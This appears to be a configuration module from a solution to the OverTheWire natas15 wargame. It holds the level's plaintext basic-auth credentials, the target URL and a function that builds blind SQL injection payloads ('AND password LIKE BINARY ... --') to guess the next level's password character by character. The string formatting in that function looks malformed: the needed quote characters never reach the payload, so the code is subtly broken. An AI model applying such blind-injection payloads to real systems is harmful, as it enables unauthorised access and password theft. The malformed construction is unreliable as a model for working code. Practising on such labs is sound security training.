"""Project variables
"""

# Standart library import
from string import ascii_letters, digits

BASIC_USER = "natas15"
BASIC_PASS = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
auth = (BASIC_USER, BASIC_PASS)

URL = "http://natas15.natas.labs.overthewire.org/index.php"

CHARS = ascii_letters + digits

NAME = 'natas16'


def query_generator(password: str, character: str) -> str:
    return f'{NAME}{" AND password LIKE BINARY "}{password}{character}%%" -- '
